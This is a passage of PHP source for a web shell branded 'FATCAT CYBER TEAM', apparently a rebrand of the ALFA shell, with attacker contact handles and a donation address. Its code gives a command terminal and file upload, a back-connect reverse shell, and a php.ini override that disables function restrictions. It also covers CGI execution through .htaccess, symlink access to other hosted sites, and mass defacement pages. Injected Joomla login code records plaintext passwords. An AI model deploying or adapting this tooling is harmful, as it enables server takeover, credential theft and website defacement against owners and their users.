<?php
/*
	Author: 	Solevisible/Fatcat-Cyber-Team
	Telegram: 	https://t.me/somsakkittisak
	YouTube: 	https://youtube.com/somsakkittisak
	Gmail:		somsakkittisak@gmail.com
...
define("__ALFA_CODE_NAME__", "Cubobae");
define("__FTC_FOLDER__", "FTC");
...
#loginbox { font-size:11px; color:#00A9FF; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
#loginbox td { border-radius:5px; font-size:11px; }
</style>
<title>~ FATCAT CYBER TEAM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="FATCAT CYBER TEAM 2012" draggable="false" src="https://i.ibb.co/54xLCBd/Fatcat-Cyber-Team.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ FATCAT CYBER TEAM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["fatcatcgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["fatcatcgiapi"])){
			if(!@file_exists("fatcatcgiapi/".$_COOKIE["fatcatcgiapi"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["fatcatcgiapi"];
			}
		}
		if(!isset($_COOKIE["fatcatcgiapi"])||$recreate){
			...
			alfacgihtaccess('cgi', "fatcatcgiapi/");
		}else{
			$lang = $_COOKIE["fatcatcgiapi"];
		}
		$cgi_ext = ".alfa";
		...
		$cgi_url = __FTC_FOLDER__."/fatcatcgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("fatcatcgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("fatcatcgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#00a9ff;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:0px;" width="200" height="200" alt="FATCAT CYBER TEAM 2012" draggable="false" src="https://imgur.com/48YgDZL.png" /></td>
</tr>
<tr>
...
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="0%"><div id="alfa_solevisible"><center><a href="https://t.me/SomsakKittisak" target="_blank"><span><font class="solevisible-text" color="#00a9ff">Fatcat Cyber ft Jack007</font></span></a></center></div></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://i.ibb.co/FYg6PMx/btn.png';
	$s['alfamini']='https://i.ibb.co/54xLCBd/Favicon-Fatcat-Cyber-Team.png';
	$s['loader']='https://i.ibb.co/54xLCBd/Favicon-Fatcat-Cyber-Team.png';
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('FATCAT CYBER TEAM is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>FATCAT CYBER TEAM Uploader</option><option value='my'>My Private Shell</option></select>";
...
if(count($selected_data) > 0){
	if($db){
		...
		echo __pre();
		echo "<center><font color='#00A9FF'>".$tbls."</font></center>";
	}
}
...
if($db){
	...
	foreach($data as $tbl => $cols){
	    echo '<li><span style="color:#00A9FF;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
	    foreach($cols["cols"] as $col){
	        echo '<li tbl="'.$tbl.'"><span style="color:#00A9FF;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
	    }
	    echo '</ul></li>';
	}
	echo '</ul>';
...
if(!empty($dbname)){
echo __pre();
$msg = "<center>Check this :  <font color='blue'>".$dfile."</font></center>";
...
if ($curl_errno > 0) {echo "<font color='blue'>Error: $curl_error</font><br>";}
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["fatcatcgiapi_mode"])&&!isset($_COOKIE["fatcatcgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __FTC_FOLDER__);
	}
	@mkdir('fatcatcgiapi',0755);
	__write_file("fatcatcgiapi/".$name, __get_resource($source));
	@chmod("fatcatcgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/fatcatcgiapi';sh getheader.alfa",false,true,true);
...
echo __pre().'<center>';
switch($resp){
	case('CODE ERREUR : 001'):echo "<b><font color='blue'>You exceeded the 400 allowed request per day</font></b>";break;
	case('CODE ERREUR : 003'):echo "<b><font color='blue'>Your request includes more than 400 hashes.</font></b>";break;
	case('CODE ERREUR : 004'):echo "<b><font color='blue'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
	case('CODE ERREUR : 005'):echo "<b><font color='blue'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
}
if(substr($resp,0,4)!='CODE'&&$resp!=''){
echo "<b>Result: <font color='blue'>".$resp."</font></b>";
}elseif(substr($resp,0,4)!='CODE'){
echo "<font color='blue'>NoT Found</font><br />";
}
echo('</center>');
}
}
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='https://i.ibb.co/9VH5Vcq/Terminal.png'> Terminal</button><br></form></td>
</tr>
<tr>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ FATCAT CYBER TEAM &copy;".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span><span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/SomsakKittisak'>@SomsakKittisak</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/fatcatcgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/fatcatcgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#00a9ff;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#00a9ff;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#00a9ff;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#00a9ff;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#00a9ff;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
...
echo __pre()."<center><p><div class=\"txtfont\"><font color='blue'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['alfa4']."');</script>";
alfaFooter();
return;
}
if($chdir_fals){
...
$s = 'http://fatcatcyberteam.pages.dev/icons/';
...
<textarea name=index rows='19' cols='103'><title>Hacked By Fatcat Cyber ft Jack007</title><b>Hacked By Fatcat Cyber ft Jack007</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By Fatcat Cyber ft Jack007</title><b>Hacked By Fatcat Cyber ft Jack007</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Fatcat Cyber ft Jack007(FATCAT CYBER TEAM)");
...
$res = "<font color='blue'>[ Success...! ]</font>";
$err = "<font color='blue'>[ Failed...! ]</font>";
...
echo "</select> <div id='bcipAction' style='display:inline-block;'><div class=\"txtfont\">IP:</div> <input type='text' style='text-align:center;' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'></div> <div class=\"txtfont\">Port: </div> <input type='text' size='5' style='text-align:center;' name='port' value='2012'> <input type='submit' value=' '></form><p><div id='bcStatus'><small>Run ` <font color='blue'>nc -l -v -p port</font> ` on your computer and press ` <font color='blue'>>></font> ` button</small></div></p></center></b></font><br>";
...
if($out==''){$out="<font color='blue'><center>[ Finished...! ]</center></font>";}
echo("<pre class='ml1' style='margin-top:5px'>{$out}</pre>");
}
}else{
echo("<pre class=ml1 style='margin-top:5px'><font color='blue'><center>[ Failed...! ]</center></font></pre>");
}
}
if($lang=='java'||$lang=='c'){
...
$code = "\$target = \"".$arg."\";\n".$code;
eval($code);
echo("<center><font color='blue'>[ Finished...! ]</font></center>");
}
echo "</pre>";
}
}
...
<input type="text" name="defacer" size="67" id="text" placeholder="FATCAT CYBER TEAM 2012" />
<br>
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __FTC_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__FTC_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__FTC_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__FTC_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__FTC_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#FFFFFF\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
...
if($m=='cgi'){
$code = "#Coded By Fatcat Cyber ft Jack007\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
}elseif($m=='sym'){
...
$bash_users  = alfaEx("cd ".$tmp_path."/fatcatcgiapi;sh basedir.alfa ".$makepwd,false,true,true);
...
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#00f4fc>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$FTC = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($FTC, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
function hijackOutput($c=0,$p=''){echo($c==0?"<center><font color='blue'>Success</font> --> path: $p</center>":'<center><font color="red">Error in inject code !</font></center>');}
...
echo @is_file($dir)?$dir."<b><font color='blue'>DeFaced...</b></font><br>" : '';
}
}elseif($m=='all'){
@file_put_contents($dir,$defpage);
echo @is_file($dir)?$dir."  <b><font color='blue'>DeFaced...</b></font><br>" : '';
...
return('<iframe src="'.__FTC_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
